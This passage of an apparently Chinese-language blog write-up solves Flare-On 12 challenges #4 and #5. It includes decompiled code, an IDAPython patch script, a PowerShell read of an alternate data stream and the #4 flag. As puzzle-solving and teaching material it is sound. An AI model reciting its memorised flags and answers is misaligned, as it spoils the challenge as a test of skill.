class="built_in">sub_4706D3</span>();</span><br><span class="line">      <span class="built_in">sub_470419</span>();</span><br><span class="line">      <span class="built_in">sub_470183</span>();</span><br><span class="line">      <span class="built_in">sub_470419</span>();</span><br><span class="line">      <span class="built_in">sub_470419</span>();</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)<span class="built_in">sub_46FE5C</span>(&amp;unk_4B20A8) &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sub_40225A</span>();</span><br><span class="line">        dword_4AD3C0 = (<span class="type">int</span>)&amp;unk_4B1F28;</span><br><span class="line">        dword_4B0750 = (<span class="type">int</span>)&amp;unk_4B<span class="number">1E53</span>;</span><br><span class="line">        strIn = aUnholydragon;                  <span class="comment">// &quot;UnholyDragon&quot;</span></span><br><span class="line">        dword_4ADFEC = (OLECHAR *)&amp;unk_4B1236;</span><br><span class="line">        dword_4B075C = (<span class="type">int</span>)&amp;unk_4B1DFE;</span><br><span class="line">        <span class="built_in">sub_402440</span>(p_sub_4A9C4E, &amp;dword_4AFFD0);</span><br><span class="line">        <span class="built_in">sub_470732</span>();</span><br><span class="line">        <span class="built_in">sub_47065B</span>();</span><br><span class="line">        <span class="built_in">sub_47027D</span>();</span><br><span class="line">        <span class="built_in">sub_4700F6</span>();</span><br><span class="line">        <span class="built_in">sub_47027D</span>();</span><br><span class="line">        <span class="built_in">sub_47027D</span>();</span><br><span class="line">        <span class="built_in">OleUninitialize</span>();</span><br><span class="line">        <span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_4A7692</span>();</span><br><span class="line">  v4 = (<span class="built_in">int</span> (*)(<span class="type">void</span>))<span class="built_in">sub_4A64B1</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">v4</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是自己实现的启动函数，由于不好定位关键逻辑，所以尝试断点WriteFile函数，发现sub_4A8AC8是实际执行的函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __stdcall <span class="title">SUB_4A8AC8_patchfile</span><span class="params">(<span class="type">int</span> Hi, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  DWORD nNumberOfBytesToWrite_1; <span class="comment">// edi</span></span><br><span class="line">  DWORD nNumberOfBytesToWrite_2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">  nNumberOfBytesToWrite_1 = nNumberOfBytesToWrite;</span><br><span class="line">  <span class="keyword">if</span> ( nNumberOfBytesToWrite )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (*(_BYTE *)(Hi + <span class="number">8</span>) &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      nNumberOfBytesToWrite = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">WriteFile</span>(*(HANDLE *)Hi, lpBuffer, nNumberOfBytesToWrite_1, &amp;nNumberOfBytesToWrite, <span class="number">0</span>);</span><br><span class="line">      nNumberOfBytesToWrite_2 = nNumberOfBytesToWrite;</span><br><span class="line">      <span class="keyword">if</span> ( nNumberOfBytesToWrite != nNumberOfBytesToWrite_1 )</span><br><span class="line">        *(_DWORD *)(Hi + <span class="number">36</span>) = <span class="number">-2146828213</span>;</span><br><span class="line">      *(_DWORD *)(Hi + <span class="number">4</span>) += nNumberOfBytesToWrite_2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = *(_DWORD *)(Hi + <span class="number">20</span>);</span><br><span class="line">      *(_DWORD *)(Hi + <span class="number">20</span>) = v5 + nNumberOfBytesToWrite;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)(v5 + nNumberOfBytesToWrite_1) &lt;= *(_DWORD *)(Hi + <span class="number">12</span>) )</span><br><span class="line">        <span class="built_in">sub_4A8962</span>(v5 + *(_DWORD *)(Hi + <span class="number">16</span>), lpBuffer, nNumberOfBytesToWrite_1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中第一次断点时lpBuffer的值就是第一个被修改的字节0x94，nNumberOfBytesToWrite_1是1，查询谁调用了这个函数，得到sub_4A8F30，其中有一些关键逻辑：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">416</span>: </span><br><span class="line">  pvarLeft.decVal.Hi32 = buf_[<span class="number">0</span>].cyVal.Hi - <span class="number">1</span>; <span class="comment">//获取文件名后缀</span></span><br><span class="line">  *(_DWORD *)&amp;pvarLeft.vt = (buf_[<span class="number">0</span>].cyVal.Hi - <span class="number">1</span>) ^ <span class="number">0x6746</span>; <span class="comment">//文件名后缀xor 0x6746</span></span><br><span class="line">  pvarSrc.cyVal.Hi = *((_DWORD *)&amp;buf_[<span class="number">1</span>].decVal.Lo64 + <span class="number">2</span> * v3 + <span class="number">1</span>);</span><br><span class="line"><span class="number">429</span>: </span><br><span class="line">  *(_DWORD *)&amp;buf_[<span class="number">3</span>].vt = (&amp;bstrLeft_1)[<span class="number">2</span> * v3];</span><br><span class="line">  *(_QWORD *)&amp;pvarLeft.vt = __PAIR64__(buf_[<span class="number">2</span>].cyVal.Lo, *(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;buf_[<span class="number">3</span>].vt); <span class="comment">//被修改的地址</span></span><br><span class="line">  pvarSrc.cyVal.Hi = Hi_4;</span><br><span class="line"><span class="number">433</span>: </span><br><span class="line">  <span class="built_in">sub_4A5EEF</span>(pvarSrc.cyVal.Hi, &amp;pvarSrc.decVal.Lo32 + v3 - <span class="number">32</span>, <span class="number">1u</span>);</span><br><span class="line">  Hi32_1 = <span class="built_in">sub_4A5FB2</span>(pvarSrc.cyVal.Hi);</span><br><span class="line"><span class="number">437</span>: </span><br><span class="line">  <span class="built_in">LOBYTE</span>(Hi32_1) = buf_[<span class="number">3</span>].decVal.Hi32;</span><br><span class="line">  pvarLeft.decVal.Hi32 = Hi32_1;</span><br><span class="line">  *(_DWORD *)&amp;pvarLeft.vt = <span class="built_in">LOBYTE</span>(buf_[<span class="number">3</span>].decVal.Hi32);</span><br><span class="line">  pvarSrc.cyVal.Hi = *((_DWORD *)&amp;buf_[<span class="number">1</span>].decVal.Lo64 + <span class="number">2</span> * v3 + <span class="number">1</span>);</span><br><span class="line"><span class="number">443</span>: </span><br><span class="line">  Hi_5 = *(_DWORD *)&amp;pvarLeft.vt ^ (<span class="type">unsigned</span> <span class="type">int</span>)(&amp;bstrRight)[<span class="number">2</span> * v3]; <span class="comment">//单字节异或加密</span></span><br></pre></td></tr></table></figure>

<p>因为本质是基于固定表的单字节的异或加密，所以直接把150改成0即可，运行发现生成了一堆exe，运行其中的编号150得到flag：</p>
<p><img src="/pictures/flareon_12_4.png" title="flag04"></p>
<p><font color=deepskyblue><strong><a href="mailto:&#x64;&#x72;&#52;&#103;&#48;&#110;&#x5f;&#x64;&#51;&#x6e;&#49;&#x61;&#x6c;&#x5f;&#111;&#102;&#x5f;&#115;&#51;&#x72;&#118;&#x31;&#x63;&#101;&#64;&#102;&#x6c;&#x61;&#x72;&#x65;&#45;&#x6f;&#110;&#46;&#x63;&#111;&#109;">dr4g0n_d3n1al_of_s3rv1ce@flare-on.com</a></strong></font></p>
<h1 id="5-ntfsm"><a href="#5-ntfsm" class="headerlink" title="#5 ntfsm"></a>#5 ntfsm</h1><p>程序中存在一个12M的巨型函数<font color=lime><strong>sub_14000C0B0</strong></font>，以及一个90781项的跳转表<font color=lime><strong>jmptable_140C687B8</strong></font>，在其反编译之前按U取消定义，否则会卡死</p>
<p>注意到函数体中都会jmp到<font color=lime><strong>loc_140C685EE</strong></font>，猜测此为控制流分发函数，跳转表内为全部函数的顺序</p>
<p>程序从start开始做了一些简单的初始化后直接进入<font color=lime><strong>0x14000C0B0</strong></font>，从这里开始分析，发现只要进行代码操作就会因跳转表无法解析卡死，所以直接清零整个跳转表后再识别</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> ida_ida</span><br><span class="line"><span class="keyword">import</span> ida_kernwin</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x140C687B8</span></span><br><span class="line">num_dwords = <span class="number">90781</span></span><br><span class="line">size = num_dwords * <span class="number">4</span></span><br><span class="line">end_addr = start_addr + size</span><br><span class="line"></span><br><span class="line">max_ea = ida_ida.inf_get_max_ea()</span><br><span class="line">zero_bytes = <span class="string">b&#x27;\x00&#x27;</span> * size</span><br><span class="line">patched = ida_bytes.patch_bytes(start_addr, zero_bytes)</span><br></pre></td></tr></table></figure>

<p>然后将0x14000C0B0的位置开始反编译，直到末尾出现一个jmp rcx（间接跳转）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main_logic</span><span class="params">(<span class="type">int</span> n2, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">fsm_make_struct</span>((__int64)v125, (__int64)<span class="string">&quot;state&quot;</span>);</span><br><span class="line">  <span class="built_in">fsm_make_struct</span>((__int64)v126, (__int64)<span class="string">&quot;input&quot;</span>);</span><br><span class="line">  <span class="built_in">fsm_make_struct</span>((__int64)v127, (__int64)<span class="string">&quot;position&quot;</span>);</span><br><span class="line">  <span class="built_in">fsm_make_struct</span>((__int64)v128, (__int64)<span class="string">&quot;transitions&quot;</span>);</span><br><span class="line">  n16 = <span class="number">0</span>;</span><br><span class="line">  lpBuffer_[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  lpBuffer_[<span class="number">1</span>] = v105;</span><br><span class="line">  ptr = <span class="built_in">fsm_get_ptr</span>((__int64)v105, (__int64)v127);</span><br><span class="line">  ptr_1 = ptr;</span><br><span class="line">  <span class="built_in">fsm_load_stage</span>(ptr, &amp;n16);</span><br><span class="line">  v7 = v106;</span><br><span class="line">  ptr_2 = <span class="built_in">fsm_get_ptr</span>((__int64)v106, (__int64)v128);</span><br><span class="line">  ptr_3 = ptr_2;</span><br><span class="line">  <span class="built_in">fsm_load_stage</span>(ptr_2, lpBuffer_);</span><br><span class="line">  <span class="keyword">if</span> ( n16 == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( lpBuffer_[<span class="number">0</span>] == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;correct!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">memset</span>(p_Filename, <span class="number">0</span>, <span class="number">0x11u</span>);</span><br><span class="line">      v10 = v107;</span><br><span class="line">      ptr_4 = <span class="built_in">fsm_get_ptr</span>((__int64)v107, (__int64)v126);</span><br><span class="line">      ptr_5 = ptr_4;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">sub_140003E0E</span>(ptr_4, p_Filename, <span class="number">0x10u</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">fsm_make_struct</span>((__int64)v129, (__int64)p_Filename);</span><br><span class="line">        <span class="built_in">j_Reward_function</span>((__int64)v129);</span><br><span class="line">        <span class="built_in">sub_140001947</span>((__int64)v129);</span><br><span class="line">      &#125;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wrong!\n&quot;</span>);</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x11u</span>);</span><br><span class="line">  v45 = v115;</span><br><span class="line">  ptr_30 = <span class="built_in">fsm_get_ptr</span>((__int64)v115, (__int64)v125);</span><br><span class="line">  ptr_31 = ptr_30;</span><br><span class="line">  <span class="built_in">fsm_load_stage</span>(ptr_30, &amp;jmptable_size);</span><br><span class="line">  <span class="keyword">if</span> ( jmptable_size == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( n2 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">sub_140004822</span>(*(_QWORD *)(a2 + <span class="number">8</span>), <span class="string">&quot;-r&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">sub_1400026CB</span>(*(_QWORD *)(a2 + <span class="number">8</span>)) != <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input 16 characters&quot;</span>);</span><br><span class="line">        <span class="built_in">sub_1400013ED</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;usage: ./ntfsm &lt;password&gt;\nto reset the binary in case of weird behavior: ./ntfsm -r&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_1400013ED</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v76 = v124;</span><br><span class="line">  ptr_52 = <span class="built_in">fsm_get_ptr</span>((__int64)v124, (__int64)v126);</span><br><span class="line">  ptr_53 = ptr_52;</span><br><span class="line">  <span class="built_in">sub_140003E0E</span>(ptr_52, buf, <span class="number">0x10u</span>);</span><br><span class="line">  v79 = <span class="number">0</span>;</span><br><span class="line">  v80 = <span class="number">0</span>;</span><br><span class="line">  v81 = <span class="number">0</span>;</span><br><span class="line">  v82 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( jmptable_size == <span class="number">-1</span> )</span><br><span class="line">    jmptable_size = <span class="number">0</span>;</span><br><span class="line">  n0x1629C = jmptable_size;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)jmptable_size &lt;= <span class="number">0x1629C</span> )</span><br><span class="line">    __asm &#123; jmp     rcx &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Something went wrong!&quot;</span>);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序是一个有限状态机，第一次初始化时，将输入存入程序的:input数据流，之后都从这个数据流读取（除非-r清除），查看其隐藏数据流的方式：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$FilePath</span> = <span class="string">&quot;.\ntfsm.exe&quot;</span></span><br><span class="line"><span class="variable">$StreamName</span> = <span class="string">&quot;state&quot;</span></span><br><span class="line"><span class="variable">$ADSPath</span> = <span class="string">&quot;<span class="variable">$FilePath</span>`:<span class="variable">$StreamName</span>&quot;</span></span><br><span class="line"><span class="variable">$Bytes</span> = <span class="built_in">Get-Content</span> <span class="literal">-Path</span> <span class="variable">$ADSPath</span> <span class="literal">-Encoding</span> Byte <span class="literal">-Raw</span></span><br><span class="line"><span class="variable">$Hex</span> = [<span class="type">System.BitConverter</span>]::ToString(<span class="variable">$Bytes</span>)</span><br><span class="line"><span class="built_in">Write-Output</span> <span class="variable">$Hex</span></span><br></pre></td></tr></table></figure>

<p>程序用输入的16字节经过处理后检测返回值是不是16，如果是则解密flag：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">Reward_function</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  phAlgorithm = <span class="number">0</span>;</span><br><span class="line">  phKey = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_140003260</span>(v28);</span><br><span class="line">  v4 = <span class="built_in">BCryptOpenAlgorithmProvider</span>(&amp;phAlgorithm, <span class="string">L&quot;AES&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">BCryptSetProperty</span>(phAlgorithm, <span class="string">L&quot;ChainingMode&quot;</span>, (PUCHAR)<span class="string">L&quot;ChainingModeCBC&quot;</span>, <span class="number">0x20u</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">BCryptOpenAlgorithmProvider</span>(&amp;hAlgorithm, <span class="string">L&quot;SHA256&quot;</span>, <span class="number">0</span>, <span class="number">0</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">BCryptCreateHash</span>(hAlgorithm, &amp;phHash, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          cbInput = <span class="built_in">sub_140003B2A</span>(a1);</span><br><span class="line">          pbInput = (PUCHAR)<span class="built_in">sub_1400014B5</span>(a1);</span><br><span class="line">          hHash = phHash;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">BCryptHashData</span>(phHash, pbInput, cbInput, <span class="number">0</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v2 = <span class="built_in">sub_140002810</span>((__int64)&amp;v11);</span><br><span class="line">            <span class="built_in">sub_140002D74</span>(v29, <span class="number">32</span>, v2);</span><br><span class="line">            cbOutput = <span class="built_in">sub_1400025BD</span>(v29);</span><br><span class="line">            pbOutput = (PUCHAR)<span class="built_in">sub_140004778</span>(v29);</span><br><span class="line">            phHash_1 = phHash;</span><br><span class="line">            v6 = <span class="built_in">BCryptFinishHash</span>(phHash, pbOutput, cbOutput, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">BCryptDestroyHash</span>(phHash);</span><br><span class="line">            <span class="built_in">BCryptCloseAlgorithmProvider</span>(hAlgorithm, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v6 &gt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              cbSecret = <span class="built_in">sub_1400025BD</span>(v29);</span><br><span class="line">              pbSecret = (PUCHAR)<span class="built_in">sub_140004778</span>(v29);</span><br><span class="line">              phAlgorithm_1 = phAlgorithm;</span><br><span class="line">              v7 = <span class="built_in">BCryptGenerateSymmetricKey</span>(phAlgorithm, &amp;phKey, <span class="number">0</span>, <span class="number">0</span>, pbSecret, cbSecret, <span class="number">0</span>);</span><br><span class="line">              <span class="keyword">if</span> ( v7 &gt;= <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( phKey )</span><br><span class="line">                &#123;</span><br><span class="line">                  v34 = <span class="built_in">sub_140002810</span>((__int64)&amp;v12);</span><br><span class="line">                  cipher[<span class="number">0</span>] = <span class="number">-127</span>;</span><br><span class="line">                  ...</span><br><span class="line">                  <span class="built_in">qmemcpy</span>(dst_, (<span class="type">const</span> <span class="type">void</span> *)<span class="built_in">sub_140002649</span>((__int64)v78, (__int64)cipher, (__int64)v84), <span class="built_in">sizeof</span>(dst_));</span><br><span class="line">                  <span class="built_in">qmemcpy</span>(dst, dst_, <span class="built_in">sizeof</span>(dst));</span><br><span class="line">                  <span class="built_in">sub_140003729</span>((__int64)v30, (__int64)dst, v34);</span><br><span class="line">                  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)<span class="built_in">sub_1400025BD</span>(v30) &gt;= <span class="number">0x10</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    ...</span><br><span class="line">                    pcbResult = <span class="number">0</span>;</span><br><span class="line">                    cbIV = <span class="built_in">sub_1400025BD</span>(v72);</span><br><span class="line">                    pbIV = (PUCHAR)<span class="built_in">sub_140004778</span>(v72);</span><br><span class="line">                    cbInput_1 = <span class="built_in">sub_1400025BD</span>(v71);</span><br><span class="line">                    pbInput_1 = (PUCHAR)<span class="built_in">sub_140004778</span>(v71);</span><br><span class="line">                    hKey = phKey;</span><br><span class="line">                    v8 = <span class="built_in">BCryptDecrypt</span>(phKey, pbInput_1, cbInput_1, <span class="number">0</span>, pbIV, cbIV, <span class="number">0</span>, <span class="number">0</span>, &amp;pcbResult, <span class="number">1u</span>);</span><br><span class="line">                    <span class="keyword">if</span> ( v8 &gt;= <span class="number">0</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v62 = <span class="built_in">sub_140002810</span>((__int64)v15);</span><br><span class="line">                      n32 = pcbResult;</span><br><span class="line">                      <span class="built_in">sub_140002D74</span>(v73, pcbResult, v62);</span><br><span class="line">                      pcbResult_2 = pcbResult;</span><br><span class="line">                      pbOutput_1 = (PUCHAR)<span class="built_in">sub_140004778</span>(v73);</span><br><span class="line">                      cbIV_1 = <span class="built_in">sub_1400025BD</span>(v72);</span><br><span class="line">                      pbIV_1 = (PUCHAR)<span class="built_in">sub_140004778</span>(v72);</span><br><span class="line">                      cbInput_2 = <span class="built_in">sub_1400025BD</span>(v71);</span><br><span class="line">                      pbInput_2 = (PUCHAR)<span class="built_in">sub_140004778</span>(v71);</span><br><span class="line">                      phKey_1 = phKey;</span><br><span class="line">                      v9 = <span class="built_in">BCryptDecrypt</span>(</span><br><span class="line">                             phKey,</span><br><span class="line">                             pbInput_2,</span><br><span class="line">                             cbInput_2,</span><br><span class="line">                             <span class="number">0</span>,</span><br><span class="line">                             pbIV_1,</span><br><span class="line">                             cbIV_1,</span><br><span class="line">                             pbOutput_1,</span><br><span class="line">                             pcbResult_2,</span><br><span class="line">                             &amp;pcbResult,</span><br><span class="line">                             <span class="number">1u</span>);</span><br><span class="line">                      <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="built_in">sub_140002A22</span>(v73, pcbResult);</span><br><span class="line">                        v3 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_140004778</span>(v73);</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Your reward: %s&quot;</span>, v3);</span><br><span class="line">                        <span class="built_in">sub_140001F9B</span>(v73);</span><br><span class="line">                        <span class="built_in">sub_140001F9B</span>(v71);</span><br><span class="line">                        <span class="built_in">sub_140001F9B</span>(v72);</span><br><span class="line">                        <span class="built_in">sub_140001F9B</span>(v30);</span><br><span class="line">                        <span class="built_in">sub_140001F9B</span>(v29);</span><br><span class="line">                        <span class="keyword">return</span> <span class="built_in">sub_140001F9B</span>(v28);</span><br><span class="line">                      &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>定义了一个64字节密文，并用之前正确输入的sha256做密钥进行AES_CBC解密</p>
<p>动态调试发现会jmp rcx，此时进入跳转表第一个函数：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 